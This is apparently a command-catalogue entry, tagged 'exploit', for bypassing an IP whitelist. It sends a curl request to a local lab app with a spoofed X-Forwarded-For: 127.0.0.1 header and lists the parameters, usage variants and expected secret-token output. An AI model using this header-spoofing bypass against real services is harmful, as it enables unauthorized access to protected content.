---
data: 'curl ''http://localhost:3000/'' -H ''X-Forwarded-For: 127.0.0.1'''
tags:
  - exploit
  - http
type: command
output: 200 OK response with 'SECRET TOKEN ACCESSIBLE ONLY BY LOCAL PC'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.570Z'
id: 033dbc95-c998-496f-9724-fc8af194a53f
verified: false
validated: true
submitted: true
---
# curl-bypass-with-header

## Command

```bash
curl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1'
```

## Description

Sends a GET request with a spoofed X-Forwarded-For header to bypass the IP whitelist and access protected content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Flag to add a custom header | Yes |
| `http://localhost:3000/` | Target URL | Yes |
| `X-Forwarded-For: 127.0.0.1` | Spoofed header value (whitelisted IP) | Yes |

## Examples

### Basic Usage

```bash
curl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1'
```

### Advanced Usage

```bash
curl -v 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1'
```

## Expected Output

HTTP/1.1 200 OK with the secret token message in the body.

## Related

- [[commands/curl-test-without-header]]
- [[procedures/Bypass-Whitelist-with-Spoofed-Header]]
